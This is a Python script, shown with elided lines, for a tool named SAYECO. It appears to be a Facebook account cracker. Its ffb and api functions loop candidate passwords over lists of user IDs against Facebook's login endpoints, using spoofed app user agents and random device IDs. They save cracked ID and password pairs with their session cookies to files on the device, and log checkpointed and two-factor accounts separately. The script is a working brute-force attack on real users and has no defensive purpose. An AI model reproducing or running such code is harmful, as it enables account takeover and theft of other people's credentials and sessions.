...
.d8888.  .d8b.  db    db d88888b  .o88b.  .d88b.  
88'  YP d8' `8b `8b  d8' 88'     d8P  Y8 .8P  Y8. 
`8bo.   88ooo88  `8bd8'  88ooooo 8P      88    88 
  `Y8b. 88~~~88    88    88~~~~~ 8b      88    88 
db   8D 88   88    88    88.     Y8b  d8 `8b  d8' 
`8888Y' YP   YP    YP    Y88888P  `Y88P'  `Y88P'    {RED} GTX
...
{WHITE}================================================
 ...
 {WHITE}Github    : {YELLOW}GTX-X1
 {WHITE}Facebook  : {YELLOW}SYC
 {WHITE}Tool Name : {YELLOW}SAYRCO
 {WHITE}Type type : {YELLOW}TEST
 {WHITE}Version   : {RED}0.1
                                           
{WHITE}================================================
        \033[1;35m Welcome To SAYECO Tool \33[0;m
{WHITE}================================================""")
def linex():
    print('\033[1;37m================================================')
        ...
        try:
                ...
                if x == ("***"):
                        ...
                        if xd in ['1','01']:
                                ...
                                print(' PUT FILE EXAMPLE :  /sdcard/File.SAYECO.etc..')
                                linex()
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [SAYECO] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/;FBAV/4Q095MQG;FBBV/333131654;FBAN/FBAN;FBAV/4Q095MQG;FBBV/333131654;FBDM//*{density=2.5,width=720,height=1920};FBLC/zh_CN;FBRV/560506726;FBCR/LG;FBMF/VIVO;FBBD/Micromax;FBPN/com.facebook.katana;FBDV/Nokia_X70;FBSV/12;FBOP/7;FBCA/x86;FBSS/;]','[FB4A/;FBAV/YZWSES93;FBBV/504446190;FBAN/FB4A;FBAV/YZWSES93;FBBV/504446190;FBDM//*{density=1.5,width=1920,height=3840};FBLC/en_US;FBRV/932989660;FBCR/OPPO;FBMF/OnePlus;FBBD/Club Mobile;FBPN/com.facebook.katana;FBDV/LG_Q11;FBSV/17;FBOP/5;FBCA/x86;FBSS/12;]','[FBAN/;FBAV/;FBBV/109302241;FBAN/FBAN;FBAV/;FBBV/109302241;FBDM//*{density=1.5,width=2560,height=2560};FBLC/it_IT;FBRV/303144804;FBCR/OPPO;FBMF/Apple;FBBD/Asus;FBPN/com.facebook.katana;FBDV/Xiaomi_Mi_Mix_7;FBSV/15;FBOP/5;FBCA/x86_64;FBSS/;]"
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [SAYECO-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SAYECO-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SAYECO-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[SAYECO-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [SAYECO-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SAYECO-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/SAYECO-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'pt_BR','client_country_code': 'BR','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {
    'authority': 'scontent.fqsf1-1.fna.fbcdn.net',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [SAYECO-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SAYECO.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SAYECO-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [USMII-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SAYECO-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
